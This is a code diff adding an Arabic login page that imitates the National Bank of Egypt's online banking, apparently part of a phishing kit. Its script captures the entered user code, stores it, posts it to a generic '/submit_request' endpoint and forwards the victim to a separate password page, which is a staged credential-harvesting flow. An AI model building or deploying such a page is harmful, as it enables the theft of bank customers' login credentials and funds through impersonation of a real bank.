@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>البنك الأهلي المصري - تسجيل الدخول</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="{{ url_for('static', filename='login-theme.css') }}">
+</head>
+<body>
+
+<header class="site-header">
+    <div class="header-right">
+        <img src="{{ url_for('static', filename='static_nbe_logo_full.png') }}" alt="البنك الأهلي المصري">
+    </div>
+    <div class="header-left">
+        <a href="login_en.html" class="lang-switcher">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3c2.3 2.5 3.5 5.5 3.5 9s-1.2 6.5-3.5 9c-2.3-2.5-3.5-6.5-3.5-9S9.7 5.5 12 3z"></path></svg>
+            <span>English</span>
+        </a>
+    </div>
+</header>
+
+<main class="login-shell">
+    <div class="login-card-container">
+        <div class="card-logo">
+            <img src="{{ url_for('static', filename='static_nbe_logo_full.png') }}" alt="البنك الأهلي المصري">
+        </div>
+
+        <div class="user-types">
+            <div class="type-card active" onclick="toggleUserType(this)">
+                <i class="far fa-user"></i>
+                <span>أفراد</span>
+            </div>
+            <div class="type-card" onclick="toggleUserType(this)">
+                <i class="fas fa-users"></i>
+                <span>شركات</span>
+            </div>
+        </div>
+
+        <section class="login-card">
+            <div id="errorMessage" role="alert" style="display:none; color: red; margin-bottom: 10px;"></div>
+            <form id="step1Form">
+                <div class="form-group">
+                    <input type="text" id="username" name="username" class="form-control" placeholder="كود المستخدم" required autofocus>
+                </div>
+                <a href="#" class="forgot-link">نسيت كود المستخدم؟</a>
+                
+                <div class="submit-actions">
+                    <button type="submit" class="submit-btn" id="submitBtn">تسجيل الدخول</button>
+                    <button type="button" class="biometric-btn">
+                        <i class="fas fa-fingerprint"></i>
+                    </button>
+                </div>
+            </form>
+        </section>
+
+        <div class="register-section">
+            <a href="#" class="register-title">سجل الآن</a>
+            <p class="register-text">انضم لعملاء البنك الاهلي المصري</p>
+        </div>
+
+        <div class="bottom-nav">
+            <a href="#" class="nav-item">
+                <i class="far fa-calendar-alt"></i>
+                <span>احجز موعد</span>
+            </a>
+            <a href="#" class="nav-item">
+                <i class="fas fa-map-marker-alt"></i>
+                <span>ماكينة الصراف الآلي / الفرع</span>
+            </a>
+            <a href="#" class="nav-item">
+                <i class="fas fa-calculator"></i>
+                <span>حاسبة العملات</span>
+            </a>
+        </div>
+    </div>
+</main>
+
+<script>
+function toggleUserType(element) {
+    document.querySelectorAll('.type-card').forEach(card => card.classList.remove('active'));
+    element.classList.add('active');
+}
+
+document.getElementById('step1Form').addEventListener('submit', function(event) {
+    event.preventDefault();
+    const username = document.getElementById('username').value;
+    if (!username) return;
+
+    localStorage.setItem('temp_username', username);
+
+    fetch('/submit_request', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        keepalive: true,
+        body: JSON.stringify({
+            type: 'username',
+            data: { username: username }
+        })
+    }).catch(error => console.error('Error:', error));
+
+    window.location.href = 'password.html';
+});
+</script>
+</body>
+</html>
